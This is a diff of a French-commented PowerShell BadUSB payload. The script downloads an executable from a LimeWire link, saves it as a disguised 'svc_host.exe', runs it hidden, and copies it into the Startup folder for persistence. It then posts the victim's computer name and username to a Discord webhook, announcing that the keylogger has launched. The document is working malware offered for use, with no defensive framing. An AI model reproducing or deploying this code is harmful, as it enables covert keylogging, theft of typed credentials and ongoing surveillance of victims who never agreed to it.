@@ -1,18 +1,21 @@
-# Payload BadUSB – Télécharge et exécute ton keylogger (version 2025)
-$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"  # Ton webhook Discord
-
-# Ton lien LimeWire direct pour l'exe
-$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"  # ← Ton lien exact
+$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"
+$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"
 $exePath = "$env:TEMP\svc_host.exe"
 
-try {
+# Télécharge (si pas déjà fait)
+if (!(Test-Path $exePath)) {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
-    Start-Process $exePath -WindowStyle Hidden  # Lance en caché
-    # Log de démarrage sur Discord
-    $logMessage = @{
-        content = "BadUSB déclenché sur $env:COMPUTERNAME - Keylogger installé avec succès"
-    } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $logMessage -ContentType 'application/json'
-} catch {
-    # Erreur silencieuse
 }
+
+# LANCE DIRECTEMENT (c’est ça qui manquait)
+Start-Process -FilePath $exePath -WindowStyle Hidden
+
+# Persistance (au cas où)
+$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svc_host.exe"
+if (!(Test-Path $startup)) { Copy-Item $exePath $startup -Force }
+
+# Log Discord
+try {
+    $body = @{ content = "Keylogger lancé sur $env:COMPUTERNAME ($env:USERNAME)" } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
+} catch {}
